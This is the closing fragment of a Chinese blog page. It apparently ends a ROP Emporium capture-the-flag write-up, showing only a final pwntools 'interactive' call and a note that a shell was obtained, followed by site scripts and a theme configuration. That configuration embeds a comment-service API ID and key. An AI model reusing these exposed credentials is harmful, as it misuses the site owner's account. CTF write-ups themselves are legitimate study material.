p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行 </p>
<p><img src="/2018/07/12/ROPEmporium-WriteUp/3.jpg" alt="3"></p>
<p>成功拿到shell</p>


  

  
    <div class="post-reward">
      <div id="reward-button">请杯咖啡呗~</div>
      <div id="qr">
        <div class="wrap">
            
            <div class="bg-wrap">
              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
              支付宝
            </div>
            
            
            <div class="bg-wrap">
                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
              微信
            </div>
            
        </div>
      </div>
    </div>
  
  
  <div class="post-guide">
    <div class="item left">
        
          <a href="2018/07/16/QCTF-writeup/"><span class="iconfont icon-left"></span>QCTF-writeup</a>
        
    </div>
    <div class="item right">
        
          <a href="2018/07/12/HITCON-Training-Writeup/">HITCON-Training-Writeup<span class="iconfont icon-right"></span></a>
        
    </div>
  </div>

  

  <div class="post-copyright">
    <div class="auth">
      本文作者：<a href="http://iosmosis.github.io">ios</a>
    </div>
    <div class="link">
      永久链接：<a href="http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/">http://iosmosis.github.io/2018/07/12/ROPEmporium-WriteUp/</a>
    </div>
    <div class="declare">
      版权声明：本文首发于<a href="http://iosmosis.github.io">ios</a>的博客，转载请注明出处！
    </div>
  </div>

  <div id="comment"></div>
</article>
        </div>
        <footer>
          <div class="copyright">
            ©2019 <a href="http://iosmosis.github.io">ios</a>. Powered by
            <a href="https://hexo.io">Hexo</a> &
            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
          </div>
          
        </footer>
      </div>
      <div id="card-wrap">
        <div class="card">
          <div class="logo-widget">
            <div class="author">
              ios
            </div>
            <div class="logo" style="background-image: url('/images/logo.jpeg')"></div>
          </div>
          
          <div class="follow-widget">
            
            <a href="https://github.com/iosmosis" target="_block">
              <span class="iconfont icon-github"></span>
            </a>
            
            <a href="2417117320" target="_block">
              <span class="iconfont icon-QQ"></span>
            </a>
             
            <a href="/atom.xml" target="_block">
              <span class="iconfont icon-rss"></span>
            </a>
            
          </div>
          <div class="category-widget">
            <div class="title">
              <span>Category</span>
            </div>
            <div class="list">
              
            </div>
          </div>
          <div class="tag-widget">
            <div class="title">
              <span>Tag cloud</span>
            </div>
            <div class="tag-cloud">
              <a href="/tags/AI外挂/" style="font-size: 14px; color: #4a4a4a">AI外挂</a> <a href="/tags/About-Me/" style="font-size: 14px; color: #4a4a4a">About Me</a> <a href="/tags/BUPT/" style="font-size: 14px; color: #4a4a4a">BUPT</a> <a href="/tags/CTFwiki/" style="font-size: 14px; color: #4a4a4a">CTFwiki</a> <a href="/tags/Getshell/" style="font-size: 14px; color: #4a4a4a">Getshell</a> <a href="/tags/Hexo/" style="font-size: 14px; color: #4a4a4a">Hexo</a> <a href="/tags/Jarvis-OJ/" style="font-size: 14px; color: #4a4a4a">Jarvis OJ</a> <a href="/tags/MISC/" style="font-size: 14px; color: #4a4a4a">MISC</a> <a href="/tags/NPUCTF/" style="font-size: 14px; color: #4a4a4a">NPUCTF</a> <a href="/tags/Pwn/" style="font-size: 20px; color: #4a4a4a">Pwn</a> <a href="/tags/RE/" style="font-size: 17px; color: #4a4a4a">RE</a> <a href="/tags/ROP/" style="font-size: 14px; color: #4a4a4a">ROP</a> <a href="/tags/ROPgadget/" style="font-size: 14px; color: #4a4a4a">ROPgadget</a> <a href="/tags/S2-045/" style="font-size: 14px; color: #4a4a4a">S2-045</a> <a href="/tags/Syclover/" style="font-size: 14px; color: #4a4a4a">Syclover</a>
            </div>
          </div>
           
          <div class="toc-widget">
            <div class="title">
              <span>Toc</span>
            </div>
            <div class="post-toc">
              <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#write432"><span class="toc-text">write432</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP构造思路"><span class="toc-text">ROP构造思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#所以可以得到exp"><span class="toc-text">所以可以得到exp</span></a></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#write464"><span class="toc-text">write464</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#所以可以构造exp"><span class="toc-text">所以可以构造exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#badchars32"><span class="toc-text">badchars32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用思路"><span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP构造"><span class="toc-text">ROP构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xor加解密操作"><span class="toc-text">xor加解密操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li>
            </div>
          </div>
           
        </div>
        
      </div>
    </div>
    <!-- swiftype -->
    
    <!-- swiftype -->
  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
  
  <p id="theme_str" hidden>{&quot;title&quot;:&quot;ios&#39;s blog&quot;,&quot;subtitle&quot;:null,&quot;description&quot;:null,&quot;author&quot;:&quot;ios&quot;,&quot;language&quot;:&quot;zh-CN&quot;,&quot;timezone&quot;:null,&quot;url&quot;:&quot;http://iosmosis.github.io&quot;,&quot;root&quot;:&quot;/&quot;,&quot;permalink&quot;:&quot;:year/:month/:day/:title/&quot;,&quot;permalink_defaults&quot;:null,&quot;source_dir&quot;:&quot;source&quot;,&quot;public_dir&quot;:&quot;public&quot;,&quot;tag_dir&quot;:&quot;tags&quot;,&quot;archive_dir&quot;:&quot;archives&quot;,&quot;category_dir&quot;:&quot;categories&quot;,&quot;code_dir&quot;:&quot;downloads/code&quot;,&quot;i18n_dir&quot;:&quot;:lang&quot;,&quot;skip_render&quot;:null,&quot;new_post_name&quot;:&quot;:title.md&quot;,&quot;default_layout&quot;:&quot;post&quot;,&quot;titlecase&quot;:false,&quot;external_link&quot;:true,&quot;filename_case&quot;:0,&quot;render_drafts&quot;:false,&quot;post_asset_folder&quot;:true,&quot;relative_link&quot;:false,&quot;future&quot;:true,&quot;highlight&quot;:{&quot;enable&quot;:false,&quot;auto_detect&quot;:false,&quot;line_number&quot;:true,&quot;tab_replace&quot;:null},&quot;default_category&quot;:&quot;uncategorized&quot;,&quot;category_map&quot;:null,&quot;tag_map&quot;:null,&quot;date_format&quot;:&quot;YYYY-MM-DD&quot;,&quot;time_format&quot;:&quot;HH:mm:ss&quot;,&quot;per_page&quot;:10,&quot;pagination_dir&quot;:&quot;page&quot;,&quot;theme&quot;:&quot;huhu&quot;,&quot;deploy&quot;:{&quot;type&quot;:&quot;git&quot;,&quot;repository&quot;:&quot;git@github.com:iosmosis/iosmosis.github.io.git&quot;,&quot;branch&quot;:&quot;master&quot;,&quot;message&quot;:&quot;Site updated at {{ now(\&quot;YYYY-MM-DD HH:mm:ss\&quot;) }}&quot;},&quot;ignore&quot;:[],&quot;hljs&quot;:{&quot;enable&quot;:true,&quot;line_number&quot;:&quot;frontend&quot;,&quot;trim_indent&quot;:&quot;backend&quot;,&quot;copy_code&quot;:false},&quot;live2d&quot;:{&quot;enable&quot;:true,&quot;scriptFrom&quot;:&quot;local&quot;,&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;use&quot;:&quot;live2d-widget-model-koharu&quot;},&quot;display&quot;:{&quot;position&quot;:&quot;right&quot;,&quot;width&quot;:150,&quot;height&quot;:300},&quot;mobile&quot;:{&quot;show&quot;:true}},&quot;prism_plugin&quot;:{&quot;mode&quot;:&quot;preprocess&quot;,&quot;theme&quot;:&quot;ghcolors&quot;,&quot;line_number&quot;:false,&quot;custom_css&quot;:&quot;path/to/your/custom.css&quot;},&quot;jsonContent&quot;:{&quot;meta&quot;:false,&quot;pages&quot;:false,&quot;posts&quot;:{&quot;title&quot;:true,&quot;date&quot;:true,&quot;path&quot;:true,&quot;text&quot;:true,&quot;raw&quot;:false,&quot;content&quot;:false,&quot;slug&quot;:false,&quot;updated&quot;:false,&quot;comments&quot;:false,&quot;link&quot;:false,&quot;permalink&quot;:false,&quot;excerpt&quot;:false,&quot;categories&quot;:false,&quot;tags&quot;:true}},&quot;archive_generator&quot;:{&quot;per_page&quot;:10,&quot;yearly&quot;:true,&quot;monthly&quot;:true,&quot;daily&quot;:false},&quot;category_generator&quot;:{&quot;per_page&quot;:10},&quot;baidusitemap&quot;:{&quot;path&quot;:&quot;baidusitemap.xml&quot;},&quot;index_generator&quot;:{&quot;per_page&quot;:10,&quot;order_by&quot;:&quot;-date&quot;},&quot;sitemap&quot;:{&quot;path&quot;:&quot;sitemap.xml&quot;},&quot;tag_generator&quot;:{&quot;per_page&quot;:10},&quot;marked&quot;:{&quot;gfm&quot;:true,&quot;pedantic&quot;:false,&quot;sanitize&quot;:false,&quot;tables&quot;:true,&quot;breaks&quot;:true,&quot;smartLists&quot;:true,&quot;smartypants&quot;:true},&quot;server&quot;:{&quot;port&quot;:4000,&quot;log&quot;:false,&quot;ip&quot;:&quot;0.0.0.0&quot;,&quot;compress&quot;:false,&quot;header&quot;:true},&quot;feed&quot;:{&quot;type&quot;:&quot;atom&quot;,&quot;limit&quot;:20,&quot;hub&quot;:&quot;&quot;,&quot;content&quot;:true,&quot;path&quot;:&quot;atom.xml&quot;},&quot;menu&quot;:{&quot;home&quot;:&quot;/&quot;,&quot;archives&quot;:&quot;/archives&quot;,&quot;about&quot;:&quot;/about&quot;,&quot;Link&quot;:&quot;/link&quot;},&quot;logo&quot;:&quot;/images/logo.png&quot;,&quot;categories_max&quot;:5,&quot;tags_max&quot;:10,&quot;site_search&quot;:true,&quot;rss&quot;:&quot;/atom.xml&quot;,&quot;follow&quot;:{&quot;github&quot;:&quot;https://github.com/iosmosis&quot;,&quot;QQ&quot;:&quot;2417117320&quot;},&quot;search_url&quot;:&quot;/search.xml&quot;,&quot;site_icp&quot;:&quot;&quot;,&quot;site_friends&quot;:{&quot;房间里的小猫咪&quot;:&quot;http://baidu.com&quot;},&quot;share&quot;:[&quot;weibo&quot;,&quot;weixin&quot;,&quot;qqkongjian&quot;,&quot;QQ&quot;,&quot;douban&quot;,&quot;facebook&quot;,&quot;twitter&quot;,&quot;google&quot;],&quot;cdn_module&quot;:{&quot;av_min&quot;:&quot;https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min&quot;,&quot;pjax&quot;:&quot;https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min&quot;,&quot;jquery&quot;:&quot;https://cdn.bootcss.com/jquery/3.4.1/jquery.min&quot;,&quot;confirm&quot;:&quot;https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min&quot;,&quot;fancybox&quot;:&quot;https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min&quot;,&quot;algoliasearch&quot;:&quot;https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min&quot;},&quot;baidu_push&quot;:true,&quot;reward&quot;:{&quot;weixin&quot;:&quot;images/weixin.png&quot;,&quot;zhifubao&quot;:&quot;images/zhifubao.png&quot;},&quot;service_worker&quot;:{&quot;open&quot;:false},&quot;valine&quot;:{&quot;API_ID&quot;:&quot;7Y7XlmC1rYmaNjqc4nP11H33-gzGzoHsz&quot;,&quot;API_KEY&quot;:&quot;CohJO6tVqg9R4yI5v5AqKEc7&quot;}}</p>
</html>
<script type="text/javascript">
  window.addEventListener('load', function() {
    ;(adsbygoogle = window.adsbygoogle || []).push({
      google_ad_client: 'undefined',
      enable_page_level_ads: true
    })

    window.THEME_CONFIG = JSON.parse(document.getElementById('theme_str').innerText)
    window.loadJs = function(d, m, a) {
      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
      var b = document.createElement('script')
      b.defer = true
      b.setAttribute('type', 'text/javascript')
      b.setAttribute('charset', 'UTF-8')
      b.setAttribute('async', 'true')
      b.setAttribute('src', d)
      m && b.setAttribute('data-main', '/scripts/app')
      if (typeof a === 'function') {
        if (window.attachEvent) {
          b.onreadystatechange = function() {
            var e = b.readyState
            if (e === 'loaded' || e === 'complete') {
              b.onreadystatechange = null
              a()
            }
          }
        } else {
          b.onload = a
        }
      }
      c.appendChild(b)
    }
    window.loadJs &&
      window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {
        require.config({
          paths: {
            // site
            util: 'util',
            share: 'share',
            search: 'search',
            iconfont: 'iconfont',
            registerSW: 'registerSW',
            valine: ['cdn/Valine.min'],

            // cdn
            av: ['https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min', 'cdn/av-min'],
            pjax: ['https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min', 'cdn/pjax.min'],
            jquery: ['https://cdn.bootcss.com/jquery/3.4.1/jquery.min', 'cdn/jquery.min'],
            confirm: ['https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min', 'cdn/jquery.confirm.min'],
            fancybox: ['https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min', 'cdn/jquery.fancybox.min'],
            algoliasearch: ['https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min', 'cdn/algoliasearchLite.min']
          },

          map: {
            '*': {
              css: 'https://cdn.bootcss.com/require-css/0.1.10/css.min.js'
            }
          },

          shim: {
            fancybox: {
              deps: ['css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css']
            },
            confirm: {
              deps: ['css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css']
            }
          },

          // 加载超时
          waitSeconds: 3
        })
      })
  })
</script>

<script>
  ;(function() {
    var bp = document.createElement('script')
    var curProtocol = window.location.protocol.split(':')[0]
    if (curProtocol === 'https') {
      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
    } else {
      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
    }
    var s = document.getElementsByTagName('script')[0]
    s.parentNode.insertBefore(bp, s)
  })()
</script>

<script src="https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min.js"></script>
<script></script>
